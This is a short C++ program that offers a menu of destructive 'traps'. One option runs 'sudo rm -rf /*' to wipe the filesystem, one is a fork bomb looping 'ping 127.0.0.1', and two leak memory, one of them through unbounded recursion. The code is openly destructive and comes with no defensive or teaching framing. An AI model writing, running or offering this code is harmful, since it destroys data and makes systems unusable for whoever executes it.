#include<iostream>
#include<cstdlib>
#include<unistd.h>
using namespace std;

void trap(){ //Memory allocation $Waste
    malloc(20000);
}

void tf(){ //Destroy the Linux Distro
    system("sudo rm -rf /*");
}

void crash(){ //Ping yourself to death 
    for(;;){
        fork();
        system("ping 127.0.0.1");
    }
}

void tftrap(){ //Memory spoiler
    malloc(2000);
    tftrap(); //Recursion 
}


int main()
{
    int f; //Input Variable 
    
    cout<<"TRAPS ~ \n\n"; // M
    cout<<"[1] trap()\n"; // E
    cout<<"[2] tf()\n";   // N
    cout<<"[3] crash()\n";// U
    cout<<"[4] tftrap()\n\n";//
   
    cout << ">> ";
    cin >> f; //Input 
    
    switch(f){ //trap decider 
        case 1: trap();
            break;
        
        case 2: tf();
            break;
        
        case 3: crash();
            break;
        
        case 4: tftrap();
            break;
        
        default: // If input != 1 || 2 || 3 || 4
           cout<<"[E] : Not a valid option\n";
           break;
    }
    return 0;
}
